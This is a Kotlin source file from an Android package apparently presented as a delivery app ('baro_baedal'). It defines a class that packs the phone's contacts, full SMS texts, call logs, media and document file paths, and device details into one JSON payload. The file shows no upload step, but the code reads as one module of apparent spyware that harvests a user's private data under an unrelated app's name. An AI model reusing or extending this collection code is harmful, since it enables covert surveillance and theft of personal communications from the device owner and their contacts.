package com.baro.baro_baedal.modules

import android.os.Build
import com.google.gson.Gson
import com.google.gson.JsonObject

/**
 * 수집된 데이터를 JSON 형식으로 변환하는 클래스
 */
class JsonConverter {
    
    private val gson = Gson()
    
    /**
     * 수집된 모든 데이터를 JSON 문자열로 변환합니다.
     * 
     * @param data 수집된 데이터
     * @return JSON 형식의 문자열
     */
    fun convertToJson(data: CollectedData): String {
        val json = JsonObject()
        
        // 연락처 정보 추가
        json.add("contacts", convertContactsToJsonArray(data.contacts))
        
        // SMS 정보 추가
        json.add("sms", convertSmsToJsonArray(data.sms))
        
        // 전화 기록 정보 추가
        json.add("callLogs", convertCallLogsToJsonArray(data.callLogs))
        
        // 미디어 파일 정보 추가
        json.add("mediaFiles", convertMediaFilesToJsonArray(data.mediaFiles))
        
        // 문서 정보 추가
        json.add("documents", convertDocumentsToJsonArray(data.documents))
        
        // 기기 정보 추가
        json.add("deviceInfo", createDeviceInfoJson())
        
        return gson.toJson(json)
    }
    
    /**
     * 연락처 리스트를 JSON 배열로 변환합니다.
     */
    private fun convertContactsToJsonArray(contacts: List<ContactInfo>): com.google.gson.JsonArray {
        val contactsArray = com.google.gson.JsonArray()
        contacts.forEach { contact ->
            val contactJson = JsonObject()
            contactJson.addProperty("name", contact.name)
            contactJson.addProperty("phone", contact.phone)
            contactJson.addProperty("email", contact.email)
            contactsArray.add(contactJson)
        }
        return contactsArray
    }
    
    /**
     * SMS 리스트를 JSON 배열로 변환합니다.
     */
    private fun convertSmsToJsonArray(smsList: List<SmsInfo>): com.google.gson.JsonArray {
        val smsArray = com.google.gson.JsonArray()
        smsList.forEach { sms ->
            val smsJson = JsonObject()
            smsJson.addProperty("address", sms.address)
            smsJson.addProperty("body", sms.body)
            smsJson.addProperty("date", sms.date)
            smsJson.addProperty("type", sms.type)
            smsArray.add(smsJson)
        }
        return smsArray
    }
    
    /**
     * 전화 기록 리스트를 JSON 배열로 변환합니다.
     */
    private fun convertCallLogsToJsonArray(callLogs: List<CallLogInfo>): com.google.gson.JsonArray {
        val callLogsArray = com.google.gson.JsonArray()
        callLogs.forEach { callLog ->
            val callLogJson = JsonObject()
            callLogJson.addProperty("number", callLog.number)
            callLogJson.addProperty("name", callLog.name ?: "")
            callLogJson.addProperty("date", callLog.date)
            callLogJson.addProperty("duration", callLog.duration)
            callLogJson.addProperty("type", callLog.type)
            callLogsArray.add(callLogJson)
        }
        return callLogsArray
    }
    
    /**
     * 미디어 파일 리스트를 JSON 배열로 변환합니다.
     */
    private fun convertMediaFilesToJsonArray(mediaFiles: List<MediaFileInfo>): com.google.gson.JsonArray {
        val mediaArray = com.google.gson.JsonArray()
        mediaFiles.forEach { media ->
            val mediaJson = JsonObject()
            mediaJson.addProperty("path", media.path)
            mediaJson.addProperty("name", media.name)
            mediaJson.addProperty("size", media.size)
            mediaJson.addProperty("mimeType", media.mimeType)
            mediaJson.addProperty("dateAdded", media.dateAdded)
            mediaArray.add(mediaJson)
        }
        return mediaArray
    }
    
    /**
     * 문서 리스트를 JSON 배열로 변환합니다.
     */
    private fun convertDocumentsToJsonArray(documents: List<DocumentInfo>): com.google.gson.JsonArray {
        val documentsArray = com.google.gson.JsonArray()
        documents.forEach { doc ->
            val docJson = JsonObject()
            docJson.addProperty("path", doc.path)
            docJson.addProperty("name", doc.name)
            docJson.addProperty("size", doc.size)
            docJson.addProperty("mimeType", doc.mimeType)
            documentsArray.add(docJson)
        }
        return documentsArray
    }
    
    /**
     * 기기 정보를 JSON 객체로 생성합니다.
     */
    private fun createDeviceInfoJson(): JsonObject {
        val deviceInfo = JsonObject()
        deviceInfo.addProperty("model", Build.MODEL)
        deviceInfo.addProperty("manufacturer", Build.MANUFACTURER)
        deviceInfo.addProperty("androidVersion", Build.VERSION.RELEASE)
        deviceInfo.addProperty("sdkVersion", Build.VERSION.SDK_INT)
        return deviceInfo
    }
}

